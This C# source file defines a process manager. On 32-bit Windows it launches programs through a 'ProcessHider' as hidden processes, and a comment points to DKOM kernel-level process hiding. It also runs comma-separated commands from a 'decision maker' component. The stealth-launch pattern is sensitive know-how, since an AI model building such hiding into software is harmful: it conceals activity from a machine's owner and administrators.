
#define CHECK_OS // for testing
// if DKOM will work on 64bit OS then undefine it

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Manager
{
    class ProcessHandler
    {
        #region fields
        private ProcessHider procHider;
        private Process processObj;
        #endregion

        public Process process { get { return processObj; } } // returns a reference to the process
        public bool IsRunning { get { return this.processObj != null && !this.processObj.HasExited; } }

        public ProcessHandler(ProcessHider procHider)
        {
            this.procHider = procHider;
        }

        /// <summary>
        /// starts a process
        /// </summary>
        /// <param name="path"> executable path </param>
        /// <param name="args"> arguments </param>
        /// <param name="outProc"> returned process object </param>
        /// <returns> true if succeeded</returns>
        public bool StartProcess(string path, string args)
        {
            if (!System.Environment.Is64BitOperatingSystem) // temp
                processObj = this.procHider.StartHiddenProcess(path, args);
            else
                processObj = this.procHider.StartVisibleProcess(path, args);
            if (processObj == null)
                return false;
            return true;
        }

        /// <summary>
        /// starts a process
        /// </summary>
        /// <param name="path"> executable path </param>
        /// <param name="args"> arguments </param>
        /// <param name="outputHandler"> function to handler the output </param>
        /// <param name="outProc"> returned process object </param>
        /// <returns> true if succeeded</returns>
        public bool StartProcess(string path, string args, DataReceivedEventHandler outputHandler)
        {
#if (CHECK_OS)
            if (!System.Environment.Is64BitOperatingSystem) // temp
#endif
                processObj = this.procHider.StartHiddenProcess(path, args, outputHandler);
#if (CHECK_OS)
            else
                processObj = this.procHider.StartVisibleProcess(path, args, outputHandler);
#endif
            if (processObj == null)
                return false;
            return true;
        }

        /// <summary>
        /// start a process from a command
        /// </summary>
        /// <param name="cmd"> command from decision maker </param>
        /// <returns> true if operation succeeded </returns>
        public bool StartProcess(string cmd)
        {
            string[] splt = cmd.Split(',');
            if (splt.Length != 3)
                throw new Exception("wrong format command");
            //return false;

            // pass output data via stdin
            DataReceivedEventHandler outputHandler = (s, e) =>
            {
                if (!String.IsNullOrEmpty(e.Data))
                    this.SendData(ProcessManager.PROCESS_DATA_CODE + e.Data);
            };


            // TODO: option - output to file
            //DataReceivedEventHandler outputHandler = (s, e) => // write the output to file
            //{
            //    StreamWriter sw = new StreamWriter(splt[2]); // create new file or clear existing one
            //    sw.Write(e.Data);
            //    sw.Close();
            //};

            return this.StartProcess(splt[1], splt[2], outputHandler);
        }

        /// <summary>
        ///  add output handler to procss
        /// </summary>
        /// <param name="outputHandler"> the function to handle the process </param>
        /// <returns> true if the operation succeeded</returns>
        public bool AddOutputHandler(DataReceivedEventHandler outputHandler)
        {
            if (this.processObj == null || this.processObj.HasExited)
                return false;
            this.processObj.OutputDataReceived += outputHandler;
            return true;
        }

        /// <summary>
        ///  add output handler to procss
        /// </summary>
        /// <param name="outputHandler"> the function to handle the process </param>
        /// <returns> true if the operation succeeded</returns>
        public bool AddExitHandler(EventHandler exitHandler)
        {
            if (this.processObj == null || this.processObj.HasExited)
                return false;
            this.processObj.Exited += exitHandler;
            return true;
        }

        /// <summary>
        /// send data to the process via stdin
        /// </summary>
        /// <param name="data"> the data to deliver </param>
        public void SendData(string data)
        {
            lock (this.process.StandardInput)
                this.processObj.StandardInput.WriteLine(data);
            //this.processObj.StandardInput.Flush();
        }

        /// <summary>
        /// kill the process
        /// </summary>
        public void Kill()
        {
            if (this.IsRunning)
                this.processObj.Kill();
        }
    }
}
